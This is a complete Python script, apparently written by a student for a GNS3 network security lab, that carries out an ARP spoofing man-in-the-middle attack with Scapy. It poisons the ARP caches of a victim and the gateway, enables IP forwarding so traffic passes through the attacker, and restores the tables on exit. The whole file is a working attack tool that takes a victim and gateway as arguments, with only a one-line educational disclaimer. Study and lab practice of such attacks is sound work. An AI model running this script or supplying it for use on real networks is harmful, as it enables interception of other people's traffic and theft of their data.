#!/usr/bin/env python3
# ARP MitM Attack - Laboratorio de Seguridad de Redes
# Autor: Estudiante de Ciberseguridad
# Entorno: GNS3 (Ambiente Controlado)
# ADVERTENCIA: Uso exclusivamente educativo en entornos controlados.

from scapy.all import *
import time, sys, os, argparse


def get_mac(ip, iface):
    """Resuelve la MAC de una IP via ARP request."""
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    ans, _ = srp(broadcast / arp_req, timeout=3, iface=iface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    print(f"[-] No se pudo resolver MAC de {ip}")
    sys.exit(1)


def spoof(target_ip, spoof_ip, target_mac):
    """Envia un ARP reply falso al objetivo."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)


def restore(dest_ip, src_ip, iface):
    """Restaura la tabla ARP correcta."""
    dest_mac = get_mac(dest_ip, iface)
    src_mac = get_mac(src_ip, iface)
    pkt = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(pkt, count=5, verbose=False)


def mitm(victim_ip, gateway_ip, iface='eth0', interval=1.5):
    """
    Ejecuta el ataque ARP MitM entre victima y gateway.
    Parametros:
        victim_ip  (str)  : IP de la victima
        gateway_ip (str)  : IP del gateway/router
        iface      (str)  : Interfaz de red (default: eth0)
        interval   (float): Segundos entre paquetes falsos
    """
    print("=" * 60)
    print("  ARP MitM ATTACK - Laboratorio GNS3")
    print(f"  Victima: {victim_ip} | Gateway: {gateway_ip} | Iface: {iface}")
    print("=" * 60)
    print("[*] Resolviendo MACs...")
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    print(f"  MAC Victima : {victim_mac}")
    print(f"  MAC Gateway : {gateway_mac}")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print("[*] IP Forwarding habilitado.")
    print("[*] Envenenando tablas ARP... (Ctrl+C para detener)")
    sent = 0
    try:
        while True:
            spoof(victim_ip, gateway_ip, victim_mac)
            spoof(gateway_ip, victim_ip, gateway_mac)
            sent += 2
            print(f"\r  [+] Paquetes ARP enviados: {sent}", end='', flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[!] Restaurando tablas ARP...")
        restore(victim_ip, gateway_ip, iface)
        restore(gateway_ip, victim_ip, iface)
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print("[+] ARP restaurado. IP Forwarding deshabilitado.")


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requiere privilegios root.")
    parser = argparse.ArgumentParser(description='ARP MitM Attack - GNS3')
    parser.add_argument('-v', '--victim', required=True, help='IP de la victima')
    parser.add_argument('-g', '--gateway', required=True, help='IP del gateway')
    parser.add_argument('-i', '--interface', default='eth0')
    parser.add_argument('--interval', type=float, default=1.5)
    args = parser.parse_args()
    mitm(args.victim, args.gateway, args.interface, args.interval)
